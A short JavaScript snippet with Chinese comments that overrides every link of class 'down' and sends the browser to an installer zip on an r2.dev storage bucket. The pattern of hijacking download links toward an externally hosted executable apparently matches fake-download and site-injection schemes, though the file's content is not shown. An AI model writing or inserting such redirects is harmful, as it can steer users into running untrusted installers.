// 获取具有类名 "down" 的链接元素
var downLinks = document.querySelectorAll(".down");

// 为每个链接添加点击事件监听器
downLinks.forEach(function(link) {
    link.addEventListener("click", function(event) {
        // 阻止默认的链接点击行为
        event.preventDefault();

        // 执行跳转操作，替换下面的URL为您想要跳转的URL 
        window.location.href = "https://pub-62d5cdf3fcfb4f1a97de07d140c6faa6.r2.dev/Linstaller_Setup_x64.zip";
    });
});
